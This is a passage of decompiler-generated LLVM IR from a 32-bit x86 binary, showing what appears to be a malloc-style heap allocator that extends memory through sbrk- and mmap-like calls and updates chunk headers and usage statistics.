dec_label_pc_804fd80:                             ; preds = %dec_label_pc_804fd6c
  store i32 %v2_804fd7c, i32* %stack_var_-92, align 4
  %v1_804fd84 = call i32 @function_8051324(i32 %v2_804fd7c)
  store i32 %v1_804fd84, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  store i32 %v1_804fd84, i32* @ebx, align 4
  %v10_804fd91 = icmp eq i32 %v1_804fd84, -1
  %v1_804fd94 = icmp eq i1 %v10_804fd91, false
  br i1 %v1_804fd94, label %dec_label_pc_804fdec.dec_label_pc_804fdf5_crit_edge, label %dec_label_pc_804fd80.dec_label_pc_804fd96_crit_edge

dec_label_pc_804fd80.dec_label_pc_804fd96_crit_edge: ; preds = %dec_label_pc_804fd80
  %v0_804fd96.pre = load i8, i8* @global_var_805b8a0.71, align 32
  br label %dec_label_pc_804fd96

dec_label_pc_804fd96:                             ; preds = %dec_label_pc_804fd80.dec_label_pc_804fd96_crit_edge, %dec_label_pc_804fd6c
  %v0_804fdc2 = phi i32 [ -1, %dec_label_pc_804fd80.dec_label_pc_804fd96_crit_edge ], [ %v1_804fd74, %dec_label_pc_804fd6c ]
  %v0_804fd96 = phi i8 [ %v0_804fd96.pre, %dec_label_pc_804fd80.dec_label_pc_804fd96_crit_edge ], [ %v0_804fd61, %dec_label_pc_804fd6c ]
  %v1_804fd96 = urem i8 %v0_804fd96, 2
  %v2_804fd96 = icmp eq i8 %v1_804fd96, 0
  br i1 %v2_804fd96, label %dec_label_pc_804fd96.dec_label_pc_804fdab_crit_edge, label %dec_label_pc_804fd9f

dec_label_pc_804fd96.dec_label_pc_804fdab_crit_edge: ; preds = %dec_label_pc_804fd96
  %v0_804fdab.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fdab

dec_label_pc_804fd9f:                             ; preds = %dec_label_pc_804fd96
  %v2_804fda3 = add i32 %v1_804fd58, %v1_804fc78
  store i32 %v2_804fda3, i32* %eax.global-to-local, align 4
  %v0_804fda5 = load i32, i32* @esi, align 4
  %v2_804fda5 = add i32 %v0_804fda5, %v2_804fda3
  %v5_804fda7 = and i32 %v2_804fda5, %v1_804fd74
  store i32 %v5_804fda7, i32* @esi, align 4
  br label %dec_label_pc_804fdab

dec_label_pc_804fdab:                             ; preds = %dec_label_pc_804fd96.dec_label_pc_804fdab_crit_edge, %dec_label_pc_804fd9f
  %v0_804fdab = phi i32 [ %v0_804fdab.pre, %dec_label_pc_804fd96.dec_label_pc_804fdab_crit_edge ], [ %v5_804fda7, %dec_label_pc_804fd9f ]
  %tmp130 = icmp ult i32 %v0_804fdab, 1048576
  br i1 %tmp130, label %dec_label_pc_804fdb3, label %dec_label_pc_804fdb8

dec_label_pc_804fdb3:                             ; preds = %dec_label_pc_804fdab
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_804fdb8

dec_label_pc_804fdb8:                             ; preds = %dec_label_pc_804fdab, %dec_label_pc_804fdb3
  %v0_804fdcc = phi i32 [ %v0_804fdab, %dec_label_pc_804fdab ], [ 1048576, %dec_label_pc_804fdb3 ]
  %tmp131 = icmp ugt i32 %v0_804fdcc, %.v1_804f903
  br i1 %tmp131, label %dec_label_pc_804fdc2, label %dec_label_pc_804fffa

dec_label_pc_804fdc2:                             ; preds = %dec_label_pc_804fdb8
  store i32 0, i32* %stack_var_-92, align 4
  %v8_804fdcf = call i32 @function_8051110(i32 0, i32 %v0_804fdcc, i32 3, i32 34, i32 0, i32 0, i32 %v0_804fdc2, i32 %v0_804fdc2)
  store i32 %v8_804fdcf, i32* %eax.global-to-local, align 4
  store i32 %v8_804fdcf, i32* @ebx, align 4
  %v10_804fdd9 = icmp eq i32 %v8_804fdcf, -1
  br i1 %v10_804fdd9, label %dec_label_pc_804fffa, label %dec_label_pc_804fdec.thread

dec_label_pc_804fdec.thread:                      ; preds = %dec_label_pc_804fdc2
  %v0_804fde2 = load i8, i8* @global_var_805b8a0.71, align 1
  %v2_804fde2 = and i8 %v0_804fde2, -2
  store i8 %v2_804fde2, i8* @global_var_805b8a0.71, align 32
  %v1_804fde9 = load i32, i32* @esi, align 4
  %v2_804fde9 = add i32 %v1_804fde9, %v8_804fdcf
  store i32 %v2_804fde9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fdf5

dec_label_pc_804fdec.dec_label_pc_804fdf5_crit_edge: ; preds = %dec_label_pc_804fd80
  %v1_804fdf9.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804fdf5

dec_label_pc_804fdf5:                             ; preds = %dec_label_pc_804fdec.dec_label_pc_804fdf5_crit_edge, %dec_label_pc_804fdec.thread
  %v1_804fdf9 = phi i32 [ %v1_804fde9, %dec_label_pc_804fdec.thread ], [ %v1_804fdf9.pre, %dec_label_pc_804fdec.dec_label_pc_804fdf5_crit_edge ]
  %v0_804fec1100 = phi i32 [ %v8_804fdcf, %dec_label_pc_804fdec.thread ], [ %v1_804fd84, %dec_label_pc_804fdec.dec_label_pc_804fdf5_crit_edge ]
  %v0_804feb399 = phi i32 [ %v2_804fde9, %dec_label_pc_804fdec.thread ], [ -1, %dec_label_pc_804fdec.dec_label_pc_804fdf5_crit_edge ]
  %v0_804fdf9 = load i32, i32* @global_var_805b8a8.68, align 8
  %v2_804fdf9 = add i32 %v1_804fdf9, %v0_804fdf9
  store i32 %v2_804fdf9, i32* @global_var_805b8a8.68, align 8
  %v2_804fdff = add i32 %v1_804fd58, %v0_804fd45
  store i32 %v2_804fdff, i32* %ecx.global-to-local, align 4
  %v2_804fe01 = sub i32 %v0_804fec1100, %v2_804fdff
  %v12_804fe01 = icmp eq i32 %v2_804fe01, 0
  %v10_804fe05 = icmp eq i32 %v0_804feb399, -1
  %tmp132 = and i1 %v12_804fe01, %v10_804fe05
  br i1 %tmp132, label %dec_label_pc_804fe0a, label %dec_label_pc_804fe1c

dec_label_pc_804fe0a:                             ; preds = %dec_label_pc_804fdf5
  %v2_804fe0a = add i32 %v1_804fdf9, %v1_804fd58
  store i32 %v0_804fd45, i32* %ecx.global-to-local, align 4
  %v1_804fe11 = or i32 %v2_804fe0a, 1
  store i32 %v1_804fe11, i32* %eax.global-to-local, align 4
  store i32 %v1_804fe11, i32* %v2_804fd4e, align 4
  br label %dec_label_pc_804ff49

dec_label_pc_804fe1c:                             ; preds = %dec_label_pc_804fdf5
  %v7_804fe01 = icmp ult i32 %v0_804fec1100, %v2_804fdff
  %v0_804fe1c = load i8, i8* @global_var_805b8a0.71, align 1
  %v1_804fe1c = sext i8 %v0_804fe1c to i32
  store i32 %v1_804fe1c, i32* %eax.global-to-local, align 4
  %v2_804fe21 = urem i8 %v0_804fe1c, 2
  %v3_804fe21 = icmp eq i8 %v2_804fe21, 0
  %brmerge = or i1 %v2_804fd58, %v3_804fe21
  %v1_804fe2b = icmp eq i1 %v7_804fe01, false
  %or.cond97 = or i1 %v1_804fe2b, %brmerge
  br i1 %or.cond97, label %dec_label_pc_804fe35, label %dec_label_pc_804fe2d

dec_label_pc_804fe2d:                             ; preds = %dec_label_pc_804fe1c
  %v1_804fe2d = and i32 %v1_804fe1c, -2
  %v4_804fe2d = trunc i32 %v1_804fe2d to i8
  store i32 %v1_804fe2d, i32* %eax.global-to-local, align 4
  store i8 %v4_804fe2d, i8* @global_var_805b8a0.71, align 32
  br label %dec_label_pc_804fe35

dec_label_pc_804fe35:                             ; preds = %dec_label_pc_804fe1c, %dec_label_pc_804fe2d
  %v0_804fe35 = phi i8 [ %v0_804fe1c, %dec_label_pc_804fe1c ], [ %v4_804fe2d, %dec_label_pc_804fe2d ]
  %v1_804fe35 = urem i8 %v0_804fe35, 2
  %v2_804fe35 = icmp eq i8 %v1_804fe35, 0
  br i1 %v2_804fe35, label %dec_label_pc_804feb3, label %dec_label_pc_804fe3e

dec_label_pc_804fe3e:                             ; preds = %dec_label_pc_804fe35
  br i1 %v2_804fd58, label %dec_label_pc_804fe4c, label %dec_label_pc_804fe42

dec_label_pc_804fe42:                             ; preds = %dec_label_pc_804fe3e
  store i32 %v2_804fe01, i32* %eax.global-to-local, align 4
  %v2_804fe46 = add i32 %v2_804fdf9, %v2_804fe01
  store i32 %v2_804fe46, i32* @global_var_805b8a8.68, align 8
  br label %dec_label_pc_804fe4c

dec_label_pc_804fe4c:                             ; preds = %dec_label_pc_804fe3e, %dec_label_pc_804fe42
  %v1_804fe4e = urem i32 %v0_804fec1100, 8
  %v2_804fe4e = icmp eq i32 %v1_804fe4e, 0
  store i32 %v1_804fe4e, i32* %edx.global-to-local, align 4
  %v1_804fe51 = icmp eq i1 %v2_804fe4e, false
  br i1 %v1_804fe51, label %dec_label_pc_804fe59, label %dec_label_pc_804fe53

dec_label_pc_804fe53:                             ; preds = %dec_label_pc_804fe4c
  store i32 %v0_804fec1100, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe63

dec_label_pc_804fe59:                             ; preds = %dec_label_pc_804fe4c
  %v2_804fe5e = sub nsw i32 8, %v1_804fe4e
  store i32 %v2_804fe5e, i32* %eax.global-to-local, align 4
  %v2_804fe60 = add i32 %v2_804fe5e, %v0_804fec1100
  store i32 %v2_804fe60, i32* @edi, align 4
  br label %dec_label_pc_804fe63

dec_label_pc_804fe63:                             ; preds = %dec_label_pc_804fe53, %dec_label_pc_804fe59
  %v0_804fe66 = phi i32 [ 0, %dec_label_pc_804fe53 ], [ %v2_804fe5e, %dec_label_pc_804fe59 ]
  %v2_804fe63 = add i32 %v1_804fdf9, %v0_804fec1100
  %v2_804fe66 = add i32 %v0_804fe66, %v1_804fd58
  store i32 %v2_804fe66, i32* %ecx.global-to-local, align 4
  %v2_804fe6f = add i32 %v2_804fe66, %v2_804fe63
  store i32 %v2_804fe6f, i32* %edx.global-to-local, align 4
  %v2_804fe75 = add i32 %v2_804fe6f, %v1_804fc78
  %v5_804fe78 = and i32 %v2_804fe75, %v1_804fd74
  %v2_804fe7f = sub i32 %v5_804fe78, %v2_804fe6f
  store i32 %v2_804fe7f, i32* %eax.global-to-local, align 4
  %v2_804fe81 = add i32 %v2_804fe7f, %v2_804fe66
  store i32 %v2_804fe81, i32* @esi, align 4
  store i32 %v2_804fe81, i32* %stack_var_-92, align 4
  %v1_804fe85 = call i32 @function_8051324(i32 %v2_804fe81)
  store i32 %v1_804fe85, i32* %eax.global-to-local, align 4
  store i32 %v1_804fe85, i32* %edx.global-to-local, align 4
  %v10_804fe8f = icmp eq i32 %v1_804fe85, -1
  %v1_804fe92 = icmp eq i1 %v10_804fe8f, false
  br i1 %v1_804fe92, label %dec_label_pc_804fea2, label %dec_label_pc_804fe94

dec_label_pc_804fe94:                             ; preds = %dec_label_pc_804fe63
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804fe99 = call i32 @function_8051324(i32 0)
  store i32 %v1_804fe99, i32* %eax.global-to-local, align 4
  store i32 %v1_804fe99, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fed6

dec_label_pc_804fea2:                             ; preds = %dec_label_pc_804fe63
  %v1_804fea2 = load i32, i32* @ebx, align 4
  %v7_804fea2 = icmp ult i32 %v1_804fe85, %v1_804fea2
  %v1_804fea4 = icmp eq i1 %v7_804fea2, false
  br i1 %v1_804fea4, label %dec_label_pc_804fedb, label %dec_label_pc_804fea6

dec_label_pc_804fea6:                             ; preds = %dec_label_pc_804fea2
  %v0_804fea6 = load i8, i8* @global_var_805b8a0.71, align 1
  %v2_804fea6 = and i8 %v0_804fea6, -2
  store i8 %v2_804fea6, i8* @global_var_805b8a0.71, align 32
  store i32 %v2_804fe63, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804feba

dec_label_pc_804feb3:                             ; preds = %dec_label_pc_804fe35
  store i32 %v0_804fec1100, i32* @edi, align 4
  br i1 %v10_804fe05, label %dec_label_pc_804febe, label %dec_label_pc_804feba

dec_label_pc_804feba:                             ; preds = %dec_label_pc_804feb3, %dec_label_pc_804fea6
  %v0_804fedb58 = phi i32 [ %v2_804fe63, %dec_label_pc_804fea6 ], [ %v0_804feb399, %dec_label_pc_804feb3 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804fedb

dec_label_pc_804febe:                             ; preds = %dec_label_pc_804feb3
  store i32 0, i32* %stack_var_-92, align 4
  %v1_804fec5 = call i32 @function_8051324(i32 0)
  store i32 %v1_804fec5, i32* %edx.global-to-local, align 4
  %v1_804fecc = load i32, i32* @ebx, align 4
  %v2_804fecc = sub i32 %v1_804fec5, %v1_804fecc
  %v1_804fece = load i32, i32* @esi, align 4
  %v2_804fece = sub i32 %v2_804fecc, %v1_804fece
  store i32 %v2_804fece, i32* %eax.global-to-local, align 4
  %v0_804fed0 = load i32, i32* @global_var_805b8a8.68, align 8
  %v2_804fed0 = add i32 %v0_804fed0, %v2_804fece
  store i32 %v2_804fed0, i32* @global_var_805b8a8.68, align 8
  br label %dec_label_pc_804fed6

dec_label_pc_804fed6:                             ; preds = %dec_label_pc_804fe94, %dec_label_pc_804febe
  %v0_804fedb57 = phi i32 [ %v1_804fe99, %dec_label_pc_804fe94 ], [ %v1_804fec5, %dec_label_pc_804febe ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804fedb

dec_label_pc_804fedb:                             ; preds = %dec_label_pc_804fea2, %dec_label_pc_804feba, %dec_label_pc_804fed6
  %v0_804fee0 = phi i32 [ %v1_804fe85, %dec_label_pc_804fea2 ], [ %v0_804fedb58, %dec_label_pc_804feba ], [ %v0_804fedb57, %dec_label_pc_804fed6 ]
  %v10_804fedb = icmp eq i32 %v0_804fee0, -1
  br i1 %v10_804fedb, label %dec_label_pc_804ff49, label %dec_label_pc_804fee0

dec_label_pc_804fee0:                             ; preds = %dec_label_pc_804fedb
  %v1_804fee0 = load i32, i32* @edi, align 4
  %v2_804fee0 = sub i32 %v0_804fee0, %v1_804fee0
  store i32 %v2_804fee0, i32* %edx.global-to-local, align 4
  store i32 %v1_804fee0, i32* @global_var_805b56c.56, align 4
  %v1_804fee8 = load i32, i32* @esi, align 4
  %v2_804fee8 = add i32 %v1_804fee8, %v2_804fee0
  %v1_804feeb = or i32 %v2_804fee8, 1
  store i32 %v1_804feeb, i32* %eax.global-to-local, align 4
  %v2_804feee = add i32 %v1_804fee0, 4
  %v3_804feee = inttoptr i32 %v2_804feee to i32*
  store i32 %v1_804feeb, i32* %v3_804feee, align 4
  %v0_804fef1 = load i32, i32* @global_var_805b8a8.68, align 8
  %v1_804fef1 = load i32, i32* @esi, align 4
  %v2_804fef1 = add i32 %v1_804fef1, %v0_804fef1
  store i32 %v2_804fef1, i32* @global_var_805b8a8.68, align 8
  br i1 %v2_804fd58, label %dec_label_pc_804ff49, label %dec_label_pc_804fefb

dec_label_pc_804fefb:                             ; preds = %dec_label_pc_804fee0
  %v1_804fefb = add i32 %v1_804fd58, -12
  store i32 %v0_804fd45, i32* %ecx.global-to-local, align 4
  %v1_804ff02 = and i32 %v1_804fefb, -8
  store i32 %v1_804ff02, i32* %eax.global-to-local, align 4
  %v1_804ff07 = or i32 %v1_804ff02, 1
  store i32 %v1_804ff07, i32* %edx.global-to-local, align 4
  %v5_804ff0a = icmp ult i32 %v1_804ff02, 15
  store i32 %v1_804ff07, i32* %v2_804fd4e, align 4
  %v0_804ff10 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ff10 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ff10 = add i32 %v0_804ff10, 4
  %v3_804ff10 = add i32 %v2_804ff10, %v1_804ff10
  %v4_804ff10 = inttoptr i32 %v3_804ff10 to i32*
  store i32 5, i32* %v4_804ff10, align 4
  %v0_804ff18 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ff18 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ff18 = add i32 %v0_804ff18, 8
  %v3_804ff18 = add i32 %v2_804ff18, %v1_804ff18
  %v4_804ff18 = inttoptr i32 %v3_804ff18 to i32*
  store i32 5, i32* %v4_804ff18, align 4
  br i1 %v5_804ff0a, label %dec_label_pc_804ff49, label %dec_label_pc_804ff22

dec_label_pc_804ff22:                             ; preds = %dec_label_pc_804fefb
  %v0_804ff25 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ff27 = add i32 %v0_804ff25, 8
  store i32 %v1_804ff27, i32* %eax.global-to-local, align 4
  %v0_804ff2a = load i32, i32* @global_var_805b884.72, align 4
  store i32 %v0_804ff2a, i32* @ebx, align 4
  store i32 %v1_804ff27, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_805b884.72, align 4
  %v1_804ff3b = call i32 @function_8050259(i32 %v1_804ff27)
  store i32 %v1_804ff3b, i32* %eax.global-to-local, align 4
  %v0_804ff40 = load i32, i32* @ebx, align 4
  store i32 %v0_804ff40, i32* @global_var_805b884.72, align 4
  br label %dec_label_pc_804ff49

dec_label_pc_804ff49:                             ; preds = %dec_label_pc_804fefb, %dec_label_pc_804fee0, %dec_label_pc_804fedb, %dec_label_pc_804fe0a, %dec_label_pc_804ff22
  %v0_804ff49 = load i32, i32* @global_var_805b8a8.68, align 8
  store i32 %v0_804ff49, i32* %eax.global-to-local, align 4
  %v1_804ff4e = load i32, i32* @global_var_805b8ac.73, align 4
  %tmp133 = icmp ugt i32 %v0_804ff49, %v1_804ff4e
  br i1 %tmp133, label %dec_label_pc_804ff56, label %dec_label_pc_804ff5b

dec_label_pc_804ff56:                             ; preds = %dec_label_pc_804ff49
  store i32 %v0_804ff49, i32* @global_var_805b8ac.73, align 4
  br label %dec_label_pc_804ff5b

dec_label_pc_804ff5b:                             ; preds = %dec_label_pc_804ff49, %dec_label_pc_804ff56
  %v1_804ff5b = load i32, i32* @global_var_805b8a4.66, align 4
  %v2_804ff5b = add i32 %v1_804ff5b, %v0_804ff49
  store i32 %v2_804ff5b, i32* %eax.global-to-local, align 4
  %v1_804ff61 = load i32, i32* @global_var_805b8b4.69, align 4
  %tmp134 = icmp ugt i32 %v2_804ff5b, %v1_804ff61
  br i1 %tmp134, label %dec_label_pc_804ff69, label %dec_label_pc_804ff6e

dec_label_pc_804ff69:                             ; preds = %dec_label_pc_804ff5b
  store i32 %v2_804ff5b, i32* @global_var_805b8b4.69, align 4
  br label %dec_label_pc_804ff6e

dec_label_pc_804ff6e:                             ; preds = %dec_label_pc_804ff5b, %dec_label_pc_804ff69
  %v0_804ff6e = load i32, i32* @global_var_805b56c.56, align 4
  store i32 %v0_804ff6e, i32* @ebx, align 4
  %v1_804ff74 = add i32 %v0_804ff6e, 4
  %v2_804ff74 = inttoptr i32 %v1_804ff74 to i32*
  %v3_804ff74 = load i32, i32* %v2_804ff74, align 4
  %v1_804ff77 = and i32 %v3_804ff74, -4
  store i32 %v1_804ff77, i32* %ecx.global-to-local, align 4
  %v10_804ff7a = icmp ult i32 %v1_804ff77, %v1_804fc17
  br i1 %v10_804ff7a, label %dec_label_pc_804fffa, label %dec_label_pc_804ff80

dec_label_pc_804ff80:                             ; preds = %dec_label_pc_804ff6e
  store i32 %.v1_804f903, i32* %esi.global-to-local, align 4
  %v2_804ff86 = sub i32 %v1_804ff77, %.v1_804f903
  store i32 %v2_804ff86, i32* %ecx.global-to-local, align 4
  %v2_804ff88 = add i32 %v0_804ff6e, %.v1_804f903
  store i32 %v2_804ff88, i32* %edx.global-to-local, align 4
  %v1_804ff8b = or i32 %.v1_804f903, 1
  store i32 %v1_804ff8b, i32* %eax.global-to-local, align 4
  store i32 %v2_804ff88, i32* @global_var_805b56c.56, align 4
  store i32 %v1_804ff8b, i32* %v2_804ff74, align 4
  %v0_804ff97.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804ff97

dec_label_pc_804ff97:                             ; preds = %dec_label_pc_804fc28, %dec_label_pc_804ff80
  %v0_804ff97 = phi i32 [ %v5_804fc3b, %dec_label_pc_804fc28 ], [ %v0_804ff97.pre, %dec_label_pc_804ff80 ]
  %v1_804ff97 = or i32 %v0_804ff97, 1
  store i32 %v1_804ff97, i32* %ecx.global-to-local, align 4
  %v0_804ff9a = load i32, i32* @ebx, align 4
  %v1_804ff9a = add i32 %v0_804ff9a, 8
  store i32 %v1_804ff9a, i32* %ebx.global-to-local, align 4
  %v1_804ff9d = load i32, i32* %edx.global-to-local, align 4
  %v2_804ff9d = add i32 %v1_804ff9d, 4
  %v3_804ff9d = inttoptr i32 %v2_804ff9d to i32*
  store i32 %v1_804ff97, i32* %v3_804ff9d, align 4
  br label %dec_label_pc_8050007

dec_label_pc_804ffa2:                             ; preds = %dec_label_pc_804f9e2
  %v5_804ffa8 = sub i32 %v1_804f9c5, %.v1_804f903
  store i32 %v5_804ffa8, i32* %eax.global-to-local, align 4
  %v2_804ffac = add i32 %v1_804ffb9, %.v1_804f903
  store i32 %v2_804ffac, i32* %edx.global-to-local, align 4
  %v1_804ffb0 = or i32 %.v1_804f903, 1
  store i32 %v2_804ffac, i32* @global_var_805b570.57, align 16
  store i32 %v1_804ffb0, i32* %v2_804f9bf, align 4
  %v0_804ffbc = load i32, i32* %eax.global-to-local, align 4
  %v0_804ffbe = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_804ffbe, i32* @global_var_805b57c.74, align 4
  %v1_804ffc4 = or i32 %v0_804ffbc, 1
  store i32 %v1_804ffc4, i32* %ecx.global-to-local, align 4
  store i32 %v0_804ffbe, i32* @global_var_805b580.59, align 128
  %v1_804ffcd = add i32 %v0_804ffbe, 8
  %v2_804ffcd = inttoptr i32 %v1_804ffcd to i32*
  store i32 ptrtoint (i32* @global_var_805b574.58 to i32), i32* %v2_804ffcd, align 4
  %v0_804ffd4 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ffd4 = add i32 %v0_804ffd4, 12
  %v2_804ffd4 = inttoptr i32 %v1_804ffd4 to i32*
  store i32 ptrtoint (i32* @global_var_805b574.58 to i32), i32* %v2_804ffd4, align 4
  %v0_804ffdb = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ffdb = load i32, i32* %edx.global-to-local, align 4
  %v2_804ffdb = add i32 %v1_804ffdb, 4
  %v3_804ffdb = inttoptr i32 %v2_804ffdb to i32*
  store i32 %v0_804ffdb, i32* %v3_804ffdb, align 4
  %v0_804ffde = load i32, i32* %eax.global-to-local, align 4
  %v1_804ffde = load i32, i32* %edx.global-to-local, align 4
  %v3_804ffde = add i32 %v1_804ffde, %v0_804ffde
  %v4_804ffde = inttoptr i32 %v3_804ffde to i32*
  store i32 %v0_804ffde, i32* %v4_804ffde, align 4
  br label %dec_label_pc_804ffec

dec_label_pc_804ffe3:                             ; preds = %dec_label_pc_804f9f1
  store i32 %.v1_804f903, i32* %ebx.global-to-local, align 4
  %v0_804ffe7 = load i32, i32* @ebp, align 4
  %v2_804ffe7 = or i32 %.v1_804f903, 4
  %v3_804ffe7 = add i32 %v0_804ffe7, %v2_804ffe7
  %v4_804ffe7 = inttoptr i32 %v3_804ffe7 to i32*
  %v5_804ffe7 = load i32, i32* %v4_804ffe7, align 4
  %v6_804ffe7 = or i32 %v5_804ffe7, 1
  store i32 %v6_804ffe7, i32* %v4_804ffe7, align 4
  br label %dec_label_pc_804ffec

dec_label_pc_804ffec:                             ; preds = %dec_label_pc_804ffa2, %dec_label_pc_804ffe3
  %v0_804ffec = load i32, i32* @ebp, align 4
  %v1_804ffec = add i32 %v0_804ffec, 8
  store i32 %v1_804ffec, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050007

dec_label_pc_804fff1:                             ; preds = %dec_label_pc_804fae1
  %v1_804fff1 = load i32, i32* @ebx, align 4
  %v2_804fff1 = add i32 %v0_804faf0, 4
  %v3_804fff1 = add i32 %v2_804fff1, %v1_804fff1
  %v4_804fff1 = inttoptr i32 %v3_804fff1 to i32*
  %v5_804fff1 = load i32, i32* %v4_804fff1, align 4
  %v6_804fff1 = or i32 %v5_804fff1, 1
  store i32 %v6_804fff1, i32* %v4_804fff1, align 4
  br label %dec_label_pc_804fff6

dec_label_pc_804fff6:                             ; preds = %dec_label_pc_804faf9, %dec_label_pc_804fff1
  %v0_804fff6 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_804fff6, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050007

dec_label_pc_804fffa:                             ; preds = %dec_label_pc_804fdb8, %dec_label_pc_804ff6e, %dec_label_pc_804fdc2
  %v0_804fffa = load i32, i32* %stack_var_-92, align 4
  %v1_804fffa = call i32 @function_804e1ec(i32 %v0_804fffa)
  store i32 %v1_804fffa, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_8050001 = inttoptr i32 %v1_804fffa to i32*
  store i32 12, i32* %v1_8050001, align 4
  br label %dec_label_pc_8050007

dec_label_pc_8050007:                             ; preds = %dec_label_pc_804fff6, %dec_label_pc_804ffec, %dec_label_pc_804ff97, %dec_label_pc_804fc53, %dec_label_pc_804fc05, %dec_label_pc_804f98c, %dec_label_pc_804fffa
  store i32 %v2_804f8c3, i32* @eax, align 4
  store i32 %v2_804f8c3, i32* %stack_var_-92, align 4
  %v2_8050010 = call i32 @function_8050de2(i32 %v2_804f8c3, i32 1)
  store i32 %v2_8050010, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050018

dec_label_pc_8050018:                             ; preds = %dec_label_pc_804f8e1, %dec_label_pc_8050007
  %v0_805001b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805001b, i32* %eax.global-to-local, align 4
  %v2_805001d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805001d, i32* @ebx, align 4
  store i32 %v0_804f8b0, i32* @esi, align 4
  store i32 %v0_804f8af, i32* @edi, align 4
  store i32 %v0_804f8ae, i32* @ebp, align 4
  ret i32 %v0_805001b

; uselistorder directives
  uselistorder i32 %v0_804ffde, { 1, 0 }
  uselistorder i32 %v0_804ffbe, { 1, 0, 2 }
  uselistorder i32 %v2_804ff5b, { 1, 0, 2 }
  uselistorder i32 %v0_804ff49, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804fee0, { 1, 0 }
  uselistorder i32 %v2_804fece, { 1, 0 }
  uselistorder i32 %v1_804fe85, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_804fe6f, { 1, 0, 2 }
  uselistorder i32 %v2_804fe63, { 1, 2, 0 }
  uselistorder i32 %v2_804fe5e, { 1, 0, 2 }
  uselistorder i32 %v1_804fe4e, { 2, 1, 0 }
  uselistorder i8 %v0_804fe1c, { 1, 0, 2 }
  uselistorder i1 %v10_804fe05, { 1, 0 }
  uselistorder i32 %v2_804fdff, { 1, 0, 2 }
  uselistorder i32 %v0_804fec1100, { 3, 1, 2, 4, 0, 6, 5 }
  uselistorder i32 %v1_804fdf9, { 2, 1, 0 }
  uselistorder i32 %v8_804fdcf, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804fdcc, { 1, 0 }
  uselistorder i32 %v0_804fdab, { 1, 0 }
  uselistorder i32 %v2_804fd7c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_804fd74, { 0, 1, 4, 2, 3 }
  uselistorder i8 %v0_804fd61, { 1, 0 }
  uselistorder i1 %v2_804fd58, { 2, 1, 0 }
  uselistorder i32 %v1_804fd58, { 4, 0, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v0_804fd45, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v2_804fd29, { 1, 0, 2 }
  uselistorder i32 %v2_804fd15, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_804fcde, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804fcd2, { 2, 1, 0 }
  uselistorder i32 %v8_804fcc1, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32 %v2_804fca8, { 1, 0, 2 }
  uselistorder i32 %v0_804fc44, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_804fc17, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804fc0d, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v0_804fbff, { 1, 0 }
  uselistorder i32 %v1_804fb96, { 1, 0 }
  uselistorder i32 %v3_804fb8a, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v0_804fb9a, { 1, 0 }
  uselistorder i32 %v2_804fb84, { 3, 2, 1, 0 }
  uselistorder i32 %esi.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_804fb817, { 1, 0 }
  uselistorder i32 %v2_804fb76, { 1, 0 }
  uselistorder i32 %v1_804fb5a, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v0_804fb56, { 2, 1, 0 }
  uselistorder i32 %v1_804fb52, { 1, 0 }
  uselistorder i32 %v1_804fb46, { 2, 1, 0 }
  uselistorder i32 %v2_804fb3c, { 1, 0 }
  uselistorder i32 %v1_804fb39, { 1, 2, 0 }
  uselistorder i32 %v4_804fad7, { 3, 6, 4, 5, 2, 1, 0 }
  uselistorder i32 %v0_804fb22, { 1, 0 }
  uselistorder i32 %v0_804faf0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_804fac3, { 2, 0, 1, 3 }
  uselistorder i32 %v0_804fa90, { 0, 2, 1 }
  uselistorder i32 %v2_804fa74, { 1, 0 }
  uselistorder i32 %v1_804fa6a, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-64.1, { 1, 0 }
  uselistorder i32 %v0_804fa65.lcssa, { 1, 0 }
  uselistorder i32 %v3_804fa55, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_804fa4c, { 1, 0, 2 }
  uselistorder i32 %v2_804fa28, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804fa10, { 2, 1, 0 }
  uselistorder i32 %v0_804f9fc, { 2, 0, 3, 1 }
  uselistorder i32 %v3_804f9c2, { 1, 0, 2 }
